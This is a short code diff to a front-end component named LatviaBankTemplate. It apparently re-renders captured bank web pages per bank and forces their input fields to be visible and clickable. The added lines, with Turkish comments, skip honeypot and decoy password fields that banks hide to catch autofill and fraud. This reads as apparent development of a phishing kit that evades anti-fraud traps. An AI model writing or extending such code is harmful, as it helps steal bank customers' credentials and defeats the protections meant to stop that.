@@ -3015,6 +3015,10 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
           if (window.location.href.includes('op-corporate')) return;
           
           if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'radio' && input.type !== 'checkbox') {
+            // Capture'da bilerek gizlenmis (honeypot/decoy) inputlari gorunur yapma -
+            // Signet'in anti-autofill sifre tuzaklari gibi
+            const origStyle = input.getAttribute('style') || '';
+            if (/display\s*:\s*none/i.test(origStyle) || /visibility\s*:\s*hidden/i.test(origStyle)) return;
             // Force input to be clickable and readable
             input.style.position = 'relative';
             input.style.zIndex = '999';
